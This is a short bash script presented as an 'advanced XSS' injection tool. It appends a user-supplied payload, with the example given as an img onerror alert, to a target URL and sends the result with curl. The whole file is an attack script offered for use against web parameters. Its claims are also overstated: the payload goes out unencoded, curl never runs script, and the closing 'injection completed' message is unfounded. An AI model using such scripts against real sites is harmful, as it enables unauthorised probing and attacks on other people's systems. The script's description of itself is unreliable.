#!/bin/bash
# Advanced XSS - Injecting an advanced XSS payload
# Options:
# <target_url> : URL with vulnerable parameter
# <payload> : XSS payload

# Usage: xss_advanced.sh <target_url> <payload>
# Example script
# xss_advanced.sh "http://example.com/search.php?query=1" "<img src=x onerror=alert('XSS')>"

# Ensure parameters are provided
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <target_url> <payload>"
    exit 1
fi

TARGET_URL=$1
PAYLOAD=$2

echo "Starting advanced XSS injection on $TARGET_URL with payload $PAYLOAD"

# Perform XSS injection
curl "$TARGET_URL$PAYLOAD"

echo "Advanced XSS injection completed."
